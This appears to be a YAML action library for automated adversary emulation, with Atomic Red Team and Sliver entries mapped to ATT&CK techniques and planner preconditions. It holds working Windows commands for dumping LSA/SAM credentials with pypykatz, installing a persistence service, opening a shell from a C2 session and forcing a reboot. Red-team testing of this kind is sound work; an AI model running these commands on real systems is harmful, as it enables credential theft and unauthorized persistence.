  - uuid: art-t1003_002-pypykatz-live-lsa
    name: Registry parse with pypykatz
    id:
      - T1003.002
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - 'OS Credential Dumping: Security Account Manager'
    description: |
      `pypykatz live lsa` reads live LSA / SAM state and prints hashes and
      cached secrets to stdout. Method 3 folds the heavy prereq chain
      (install Python, create venv, pip install pypykatz) — this fold is
      expensive on first run; realistic simulation envs would pre-provision
      Python. ART auto_generated_guid a96872b2-cbf3-46cf-8eb4-27e8c0e85263.
    execution:
      executor: Powershell Executor
      command: |
        $venv = "#{venv_path}"
        if (-not (Test-Path "$venv\Scripts\pypykatz.exe")) {
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          if (-not (Get-Command py -ErrorAction Ignore)) {
            $pySetup = "$env:TEMP\python_setup.exe"
            Invoke-WebRequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -OutFile $pySetup
            Start-Process $pySetup -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1' -Wait
          }
          py -m venv $venv
          & "$venv\Scripts\pip.exe" install --no-cache-dir pypykatz | Out-Null
        }
        & "$venv\Scripts\pypykatz.exe" live lsa
    arguments:
      executor:
        description: The Powershell session ID used to invoke pypykatz.
        required: true
        pddl_index: executor1_var_in_plan
      venv_path:
        default: C:\Users\Public\venv_pypykatz
        description: Target-side path to a Python venv containing pypykatz.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (credential-data ?d - data ?target - host)
      - (data-stored-c2 ?d - data)
  - uuid: art-t1543_003-new-service-ps
    name: Service Installation PowerShell
    id:
      - T1543.003
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Persistence
    technique:
      - 'Create or Modify System Process: Windows Service'
    description: |
      PowerShell equivalent of `sc create` — uses the native `New-Service`
      cmdlet to create and start a Windows service persistence pathway.
      ART auto_generated_guid 491a4af6-a521-4b74-b23b-f7b3f1ee9e77.
    execution:
      executor: Powershell Executor
      command: |
        New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
        Start-Service -Name "#{service_name}"
    arguments:
      executor:
        description: The Powershell session ID used to create the service.
        required: true
        pddl_index: executor1_var_in_plan
      service_name:
        default: AtomicTestServicePs
        description: Windows service name to create.
        required: true
      binary_path:
        default: C:\Users\Public\service.exe
        description: Full path to the service binary.
        required: true
        pddl_index: string4_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (command-execution-at-startup ?c - string ?target - host)
  - uuid: sliver-cmd
    name: Execute Command (cmd.exe)
    id:
      - T1059.003
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: Windows Command Shell
    description: The `cmd.exe` command executes a Windows command. It runs the specified
      command on the remote host and returns the result. This command is useful for
      performing various system tasks.
    execution:
      executor: Sliver Session Derive
      command: |
        # no-op — derivation only
    arguments:
      executor_parent:
        description: The session ID of the active Sliver connection.
        required: true
        pddl_index: executor2_var_in_plan
      executor_derived:
        description: The derived Windows CMD executor.
        required: true
        pddl_index: executor0_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (sliver-session ?executorID - executor ?target - host)
    effects:
      - (command-prompt ?s2 - executor ?target - host)
      - operator: When
        params:
          condition: (elevated-executor ?executorID - executor)
          effect: (elevated-executor ?s2 - executor)
  - uuid: art-t1529-restart
    name: Restart System - Windows
    id:
      - T1529
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Impact
    technique:
      - System Shutdown/Reboot
    description: |
      Issues `shutdown /r` to reboot the target. Interrupts availability
      briefly; also weaponised as a trigger for reboot-scoped persistence
      or as a wipe-completion step in some ransomware. ART
      auto_generated_guid f4648f0d-bf78-483c-bafc-3ec99cd1c302.
    execution:
      executor: Command Prompt Executor
      command: |
        shutdown /r /t #{timeout}
    arguments:
      executor:
        description: The Command Prompt session ID used to invoke shutdown.
        required: true
        pddl_index: executor0_var_in_plan
      timeout:
        default: 60
        description: Seconds until the reboot fires.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (command-prompt ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (system-reboot ?target - host)
